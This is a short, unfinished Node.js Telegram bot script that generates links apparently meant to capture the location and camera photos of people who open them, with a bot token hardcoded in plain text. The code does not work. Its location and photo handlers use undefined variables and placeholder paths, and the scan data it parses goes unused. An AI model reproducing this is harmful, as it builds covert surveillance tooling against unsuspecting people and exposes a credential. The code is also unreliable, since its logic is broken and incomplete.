const TelegramBot = require('node-telegram-bot-api');
const token = '6477885066:AAFjM-M9ECJmkPeQZDu10Q1eHliGMV_F7qM';
const bot = new TelegramBot(token, { polling: true });


bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  const messageText = msg.text;

  if (messageText === '/generate_link') {
    const link = `https://t.me/APICopy1_Bot?start=location_${chatId}`;
    bot.sendMessage(chatId, `Here's your link: ${link}`);
  }
});


bot.onText(/\/start (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const linkData = match[1].split('_');
  const scanType = linkData[0];
  const scanCount = linkData[1];

  // Perform actions based on the link data
});

// For location scan
bot.onText(/\/start location_(.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  // Get the user's location and send it back
  bot.sendLocation(chatId, latitude, longitude);
});

// For photo scan
bot.onText(/\/start camera_(.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const photoCount = parseInt(match[1]);
  // Send live photos taken by the camera
  for (let i = 0; i < photoCount; i++) {
    bot.sendPhoto(chatId, 'path_to_photo');
  }
});

// Implement similar logic for other scan types

